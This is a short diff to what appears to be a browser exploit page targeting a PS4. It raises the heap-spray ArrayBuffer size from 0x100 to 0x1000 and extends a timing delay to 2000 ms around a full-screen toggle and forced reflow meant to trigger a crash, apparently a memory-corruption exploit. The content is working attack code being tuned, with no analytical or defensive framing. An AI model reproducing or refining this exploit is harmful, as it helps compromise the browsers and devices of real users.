@@ -37,7 +37,7 @@
     function heapSpray() {
       window.spray = [];
       for (let i = 0; i < 500; i++) {
-        window.spray.push(new ArrayBuffer(0x100));
+        window.spray.push(new ArrayBuffer(0x1000));
       }
     }
 
@@ -64,7 +64,7 @@
         status.textContent = "CRASH NOW! ENTER/EXIT FULL-SCREEN!";
         box.remove();
         document.body.offsetHeight; // Force reflow
-      }, 800); // Adjusted delay for PS4's slow full-screen
+      }, 2000); // Adjusted delay for PS4's slow full-screen
     }
 
     // Start on click
